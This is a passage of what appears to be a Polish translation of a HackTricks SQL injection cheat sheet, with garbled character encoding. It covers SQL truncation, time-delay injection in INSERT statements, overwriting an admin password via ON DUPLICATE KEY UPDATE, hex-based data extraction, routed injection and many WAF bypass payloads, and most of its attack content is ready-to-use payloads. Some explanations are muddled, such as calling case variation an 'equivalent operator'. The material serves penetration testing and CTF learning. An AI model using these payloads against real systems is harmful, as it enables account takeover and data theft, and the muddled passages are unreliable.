* **Atak obcinania SQL** (gdy istnieje pewien rodzaj **ograniczenia dÅ‚ugoÅ›ci** w nazwie uÅ¼ytkownika lub adresie e-mail) --> UtwÃ³rz uÅ¼ytkownika o nazwie: **admin \[duÅ¼o spacji] a**

#### Atak obcinania SQL

JeÅ›li baza danych jest podatna, a maksymalna liczba znakÃ³w dla nazwy uÅ¼ytkownika wynosi na przykÅ‚ad 30, a chcesz podszyÄ‡ siÄ™ pod uÅ¼ytkownika **admin**, sprÃ³buj utworzyÄ‡ nazwÄ™ uÅ¼ytkownika o nazwie: "_admin \[30 spacji] a_" i dowolne hasÅ‚o.

Baza danych **sprawdzi**, czy wprowadzona **nazwa uÅ¼ytkownika** **istnieje** w bazie danych. JeÅ›li **nie**, obetnie **nazwÄ™ uÅ¼ytkownika** do **maksymalnej dozwolonej liczby znakÃ³w** (w tym przypadku do: "_admin \[25 spacji]_") i **automatycznie usunie wszystkie spacje na koÅ„cu, aktualizujÄ…c** w bazie danych uÅ¼ytkownika "**admin**" z **nowym hasÅ‚em** (moÅ¼e pojawiÄ‡ siÄ™ pewien bÅ‚Ä…d, ale to nie oznacza, Å¼e nie zadziaÅ‚aÅ‚o).

WiÄ™cej informacji: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Uwaga: Ten atak nie bÄ™dzie juÅ¼ dziaÅ‚aÅ‚ zgodnie z opisem powyÅ¼ej w najnowszych instalacjach MySQL. ChociaÅ¼ porÃ³wnania nadal ignorujÄ… koÅ„cowe biaÅ‚e znaki domyÅ›lnie, prÃ³ba wstawienia ciÄ…gu znakÃ³w dÅ‚uÅ¼szego niÅ¼ dÅ‚ugoÅ›Ä‡ pola spowoduje bÅ‚Ä…d, a wstawienie siÄ™ nie powiedzie. Aby uzyskaÄ‡ wiÄ™cej informacji na ten temat, sprawdÅº: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQL Insert z opÃ³Åºnieniem czasowym

Dodaj tyle `','',''`, ile uwaÅ¼asz za konieczne, aby wyjÅ›Ä‡ z instrukcji VALUES. JeÅ›li wystÄ…pi opÃ³Åºnienie, masz SQLInjection.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

Klauzula `ON DUPLICATE KEY UPDATE` w MySQL sÅ‚uÅ¼y do okreÅ›lenia dziaÅ‚aÅ„, ktÃ³re baza danych ma podjÄ…Ä‡, gdy prÃ³ba wstawienia wiersza spowoduje powstanie duplikatu wartoÅ›ci w indeksie UNIQUE lub PRIMARY KEY. PoniÅ¼szy przykÅ‚ad pokazuje, jak moÅ¼na wykorzystaÄ‡ tÄ™ funkcjÄ™ do modyfikacji hasÅ‚a konta administratora:

PrzykÅ‚ad wstrzykniÄ™cia payloadu:

Payload wstrzykniÄ™cia moÅ¼e zostaÄ‡ stworzony w nastÄ™pujÄ…cy sposÃ³b, gdzie prÃ³buje siÄ™ wstawiÄ‡ dwa wiersze do tabeli `users`. Pierwszy wiersz jest podstÄ™pem, a drugi wiersz celuje w istniejÄ…cy adres e-mail administratora z zamiarem aktualizacji hasÅ‚a:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Oto jak to dziaÅ‚a:

- Zapytanie prÃ³buje wstawiÄ‡ dwa wiersze: jeden dla `generic_user@example.com` i drugi dla `admin_generic@example.com`.
- JeÅ›li wiersz dla `admin_generic@example.com` juÅ¼ istnieje, wywoÅ‚ywane jest polecenie `ON DUPLICATE KEY UPDATE`, ktÃ³re instruuje MySQL, aby zaktualizowaÄ‡ pole `password` istniejÄ…cego wiersza na "bcrypt_hash_of_newpassword".
- W rezultacie uwierzytelnienie moÅ¼e byÄ‡ nastÄ™pnie prÃ³bowane przy uÅ¼yciu `admin_generic@example.com` z hasÅ‚em odpowiadajÄ…cym skrÃ³conemu bcrypt ("bcrypt_hash_of_newpassword" reprezentuje skrÃ³t bcrypt nowego hasÅ‚a, ktÃ³ry powinien zostaÄ‡ zastÄ…piony rzeczywistym skrÃ³tem poÅ¼Ä…danego hasÅ‚a).

### Wydobycie informacji

#### Tworzenie 2 kont jednoczeÅ›nie

Podczas prÃ³by utworzenia nowego uÅ¼ytkownika i nazwy uÅ¼ytkownika, wymagane sÄ… hasÅ‚o i adres e-mail:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### UÅ¼ywanie systemu dziesiÄ™tnego lub szesnastkowego

Za pomocÄ… tej techniki moÅ¼esz wydobyÄ‡ informacje, tworzÄ…c tylko 1 konto. WaÅ¼ne jest zauwaÅ¼enie, Å¼e nie musisz komentowaÄ‡ niczego.

UÅ¼ywajÄ…c **hex2dec** i **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Aby uzyskaÄ‡ tekst, moÅ¼na uÅ¼yÄ‡:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
Za pomocÄ… **hex** i **replace** (oraz **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) to najwaÅ¼niejsze wydarzenie zwiÄ…zane z cyberbezpieczeÅ„stwem w **Hiszpanii** i jedno z najwaÅ¼niejszych w **Europie**. MajÄ…c na celu promowanie wiedzy technicznej, ten kongres jest gorÄ…cym punktem spotkaÅ„ dla profesjonalistÃ³w technologii i cyberbezpieczeÅ„stwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

## WstrzykniÄ™cie SQL z przekierowaniem

WstrzykniÄ™cie SQL z przekierowaniem to sytuacja, w ktÃ³rej zapytanie podatne na wstrzykniÄ™cie nie generuje wyniku, ale wynik zapytania podatnego na wstrzykniÄ™cie jest przekierowywany do zapytania generujÄ…cego wynik. ([Z artykuÅ‚u](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

PrzykÅ‚ad:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF Bypass

[PoczÄ…tkowe bypassy stÄ…d](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### Bypass bez spacji

Brak spacji (%20) - bypassowanie za pomocÄ… alternatywnych biaÅ‚ych znakÃ³w
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
# No Whitespace - bypass uÅ¼ywajÄ…c komentarzy

W niektÃ³rych przypadkach, gdy atakujÄ…cy nie moÅ¼e wstawiÄ‡ spacji w swoim kodzie SQL, moÅ¼e uÅ¼yÄ‡ komentarzy jako alternatywy. Komentarze sÄ… ignorowane przez parser SQL, wiÄ™c moÅ¼na je wykorzystaÄ‡ do pominiÄ™cia biaÅ‚ych znakÃ³w.

## Komentarze jednolinijkowe

W przypadku komentarzy jednolinijkowych, atakujÄ…cy moÅ¼e uÅ¼yÄ‡ podwÃ³jnego myÅ›lnika (`--`) lub znaku hash (`#`) jako znacznika komentarza. Wszystko po tym znaczniku zostanie zignorowane przez parser SQL.

PrzykÅ‚ad:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='password'
```

## Komentarze wielolinijkowe

W przypadku komentarzy wielolinijkowych, atakujÄ…cy moÅ¼e uÅ¼yÄ‡ znacznikÃ³w `/*` i `*/` do oznaczenia obszaru komentarza. Wszystko pomiÄ™dzy tymi znacznikami zostanie zignorowane przez parser SQL.

PrzykÅ‚ad:

```sql
SELECT * FROM users WHERE username='admin'/*' AND password='password'*/
```

W przypadku komentarzy wielolinijkowych, atakujÄ…cy moÅ¼e rÃ³wnieÅ¼ uÅ¼yÄ‡ znacznika `#` jako alternatywy dla `/*`.

PrzykÅ‚ad:

```sql
SELECT * FROM users WHERE username='admin'#' AND password='password'
```

## Podsumowanie

Wykorzystanie komentarzy jako alternatywy dla biaÅ‚ych znakÃ³w moÅ¼e byÄ‡ przydatne w przypadkach, gdy atakujÄ…cy nie moÅ¼e wstawiÄ‡ spacji w kodzie SQL. UmoÅ¼liwia to pominiÄ™cie filtrÃ³w i wykonanie nieautoryzowanych zapytaÅ„ SQL. Jednak naleÅ¼y pamiÄ™taÄ‡, Å¼e ta technika moÅ¼e byÄ‡ wykryta przez narzÄ™dzia do analizy kodu SQL, dlatego zawsze naleÅ¼y byÄ‡ ostroÅ¼nym i stosowaÄ‡ inne metody, jeÅ›li to moÅ¼liwe.
```sql
?id=1/*comment*/and/**/1=1/**/--
```
# Wstrzykiwanie SQL - Bypassowanie za pomocÄ… nawiasÃ³w

Wstrzykiwanie SQL to technika ataku, ktÃ³ra polega na wstrzykiwaniu zÅ‚oÅ›liwego kodu SQL do aplikacji internetowej. Jednym z popularnych sposobÃ³w na obejÅ›cie mechanizmÃ³w zabezpieczeÅ„ jest wykorzystanie nawiasÃ³w.

## Bypassowanie za pomocÄ… nawiasÃ³w

W przypadku, gdy aplikacja internetowa filtruje znaki biaÅ‚e (whitespace), moÅ¼na sprÃ³bowaÄ‡ obejÅ›Ä‡ to ograniczenie, wykorzystujÄ…c nawiasy. Nawiasy sÄ… czÄ™sto dozwolone w zapytaniach SQL i mogÄ… byÄ‡ uÅ¼yte do wstrzykniÄ™cia kodu SQL bez koniecznoÅ›ci uÅ¼ycia znakÃ³w biaÅ‚ych.

PrzykÅ‚ad:

```sql
SELECT * FROM users WHERE username='admin' AND password=('' OR '1'='1')
```

W powyÅ¼szym przykÅ‚adzie, nawiasy sÄ… uÅ¼ywane do wstrzykniÄ™cia warunku, ktÃ³ry zawsze jest prawdziwy (`1=1`). W ten sposÃ³b, niezaleÅ¼nie od wartoÅ›ci pola `password`, warunek zostanie speÅ‚niony i zwrÃ³cone zostanÄ… wszystkie rekordy z tabeli `users`.

## Podsumowanie

Bypassowanie filtracji znakÃ³w biaÅ‚ych za pomocÄ… nawiasÃ³w jest jednym z wielu sposobÃ³w na obejÅ›cie mechanizmÃ³w zabezpieczeÅ„ wstrzykiwania SQL. WaÅ¼ne jest jednak, aby pamiÄ™taÄ‡, Å¼e kaÅ¼da aplikacja moÅ¼e mieÄ‡ inne mechanizmy zabezpieczeÅ„ i wymaga indywidualnego podejÅ›cia.
```sql
?id=(1)and(1)=(1)--
```
### Bypass bez uÅ¼ycia przecinkÃ³w

Bypass bez przecinkÃ³w - uÅ¼ycie OFFSET, FROM i JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### OgÃ³lne obejÅ›cia

Czarna lista z uÅ¼yciem sÅ‚Ã³w kluczowych - obejÅ›cie za pomocÄ… wielkich/maÅ‚ych liter
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
Czarna lista z uÅ¼yciem sÅ‚Ã³w kluczowych bez uwzglÄ™dniania wielkoÅ›ci liter - obejÅ›cie za pomocÄ… operatora rÃ³wnowaÅ¼nego. 

W przypadku czarnej listy, ktÃ³ra uÅ¼ywa sÅ‚Ã³w kluczowych do blokowania niebezpiecznych zapytaÅ„ SQL, moÅ¼na prÃ³bowaÄ‡ obejÅ›Ä‡ to zabezpieczenie, korzystajÄ…c z operatora rÃ³wnowaÅ¼nego. Operator rÃ³wnowaÅ¼ny to operator, ktÃ³ry wykonuje tÄ™ samÄ… funkcjÄ™ co operator porÃ³wnania, ale nie uwzglÄ™dnia wielkoÅ›ci liter. MoÅ¼na go uÅ¼yÄ‡ do wprowadzenia wartoÅ›ci, ktÃ³re sÄ… rÃ³wnowaÅ¼ne zablokowanym sÅ‚owom kluczowym, ale majÄ… innÄ… wielkoÅ›Ä‡ liter.

Na przykÅ‚ad, jeÅ›li sÅ‚owo kluczowe na czarnej liÅ›cie to "SELECT", moÅ¼na sprÃ³bowaÄ‡ uÅ¼yÄ‡ operatora rÃ³wnowaÅ¼nego, takiego jak "sElEcT" lub "sELECT", aby obejÅ›Ä‡ blokadÄ™. Operator rÃ³wnowaÅ¼ny pozwoli na wykonanie zapytania, pomimo Å¼e sÅ‚owo kluczowe jest zablokowane na czarnej liÅ›cie.

Warto jednak pamiÄ™taÄ‡, Å¼e to tylko jedna z wielu technik obejÅ›cia czarnej listy. Istnieje wiele innych metod, ktÃ³re moÅ¼na zastosowaÄ‡ w zaleÅ¼noÅ›ci od konkretnego przypadku. WaÅ¼ne jest rÃ³wnieÅ¼, aby pamiÄ™taÄ‡ o etyce i legalnoÅ›ci podczas wykonywania testÃ³w penetracyjnych.
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Bypass WAF za pomocÄ… notacji naukowej

MoÅ¼esz znaleÅºÄ‡ bardziej szczegÃ³Å‚owe wyjaÅ›nienie tego triku na [blogu gosecure](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
W zasadzie moÅ¼esz uÅ¼yÄ‡ notacji naukowej w nieoczekiwany sposÃ³b, aby obejÅ›Ä‡ WAF:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### OminiÄ™cie ograniczeÅ„ nazw kolumn

Po pierwsze, zauwaÅ¼, Å¼e jeÅ›li **oryginalne zapytanie i tabela, z ktÃ³rej chcesz wydobyÄ‡ flagÄ™, majÄ… takÄ… samÄ… liczbÄ™ kolumn**, moÅ¼esz po prostu uÅ¼yÄ‡: `0 UNION SELECT * FROM flag`

MoÅ¼liwe jest **uzyskanie dostÄ™pu do trzeciej kolumny tabeli bez uÅ¼ycia jej nazwy** za pomocÄ… zapytania takiego jak: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, wiÄ™c w przypadku ataku SQL Injection wyglÄ…daÅ‚oby to tak:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Lub uÅ¼ywajÄ…c **omijania przecinka**:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Ten trik zostaÅ‚ zaczerpniÄ™ty z [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### NarzÄ™dzia sugerujÄ…ce obejÅ›cie WAF

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Inne przewodniki

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Lista wykrywania prÃ³b siÅ‚owych

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) to najwaÅ¼niejsze wydarzenie zwiÄ…zane z cyberbezpieczeÅ„stwem w **Hiszpanii** i jedno z najwaÅ¼niejszych w **Europie**. MajÄ…c na celu promowanie wiedzy technicznej, ten kongres jest gorÄ…cym punktem spotkaÅ„ dla profesjonalistÃ³w technologii i cyberbezpieczeÅ„stwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie cyberbezpieczeÅ„stwa**? Chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks**? A moÅ¼e chcesz mieÄ‡ dostÄ™p do **najnowszej wersji PEASS lub pobraÄ‡ HackTricks w formacie PDF**? SprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **DoÅ‚Ä…cz do** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
